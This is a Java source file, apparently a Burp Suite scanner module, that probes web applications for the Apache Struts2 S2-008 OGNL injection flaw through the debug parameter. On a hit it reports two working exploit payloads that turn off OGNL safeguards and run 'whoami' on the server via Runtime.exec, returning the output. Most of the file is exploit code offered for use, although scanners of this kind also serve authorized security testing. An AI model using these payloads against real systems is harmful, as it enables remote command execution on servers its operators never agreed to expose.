package module.java.vul;

import burp.*;
import module.Util;

import java.net.URLEncoder;
import java.util.Arrays;

public class S2_008 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
    public String poc =
        "debug=command&expression=" +
        "(" +
        "#_memberAccess.allowStaticMethodAccess=true," +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
        "#out.getWriter().print(\"" + injectMark[0] + "\")," +
        "#out.getWriter().print(\"" + injectMark[1] + "\")," +
        "#out.getWriter().flush()," +
        "#out.getWriter().close()" +
        ")";
    public String exp1 =
        "debug=command&expression=" +
        "(" +
        "#_memberAccess.allowStaticMethodAccess=true," +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
        "#cmd=\"whoami\"," +
        "#ret=@java.lang.Runtime@getRuntime().exec(#cmd)," +
        "#data=new java.io.DataInputStream(#ret.getInputStream())," +
        "#res=new byte[4]," +
        "#data.readFully(#res)," +
        "#echo=new java.lang.String(#res)," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
        "#out.getWriter().print(#echo)," +
        "#out.getWriter().flush()," +
        "#out.getWriter().close()" +
        ")";
    public String exp2 =
        "debug=command&expression=" +
        "(" +
        "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
        "@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())" +
        ")";

    @Override
    public IScanIssue start() {
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        byte[] request = iHttpRequestResponse.getRequest();

        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }

        String[] parameters = poc.split("&");
        byte[] newRequest = request;
        for (String parameter: parameters) {
            String[] tmp = parameter.split("=", 2);
            String parameterName = tmp[0];
            String parameterValue = tmp[1];
            IParameter newParameter = helpers.buildParameter(parameterName, URLEncoder.encode(parameterValue), in);
            newRequest = helpers.updateParameter(newRequest, newParameter);
        }
        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
        byte[] response = newHttpRequestResponse.getResponse();
        IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
        byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
        String bodyText = new String(body);
        if (bodyText.contains(randomMark)) {
            this.iHttpRequestResponse = newHttpRequestResponse;
            StringBuilder sb = new StringBuilder();
            sb.append("exp1:");
            sb.append("\n");
            sb.append(URLEncoder.encode(exp1).replace("%3D", "=").replace("%26", "&"));
            sb.append("\n\n");
            sb.append("exp2:");
            sb.append("\n");
            sb.append(URLEncoder.encode(exp2).replace("%3D", "=").replace("%26", "&"));
            this.detail = sb.toString();
            return creatCustomScanIssue();
        }

        return null;
    }
}
